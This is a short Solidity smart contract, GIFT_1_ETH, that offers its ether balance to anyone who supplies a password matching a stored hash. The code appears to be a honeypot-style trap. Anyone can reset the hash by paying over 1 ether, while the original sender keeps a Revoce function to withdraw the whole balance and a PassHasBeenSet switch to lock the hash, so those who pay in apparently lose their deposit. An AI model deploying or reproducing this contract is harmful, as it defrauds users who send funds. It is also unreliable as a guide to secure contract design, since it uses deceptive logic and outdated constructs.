pragma solidity ^0.4.19;

contract GIFT_1_ETH
{
    bytes32 public hashPass;
    
    address sender;
	
	bool passHasBeenSet = false;
	
	uint lastBlock;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
        lastBlock = block.number;
    }
    
    function GetGift(bytes pass)
    external
    payable
    oneforblock
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    oneforblock
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
    
    modifier oneforblock
    {
        require(lastBlock<block.number);
        _;
    }
    
}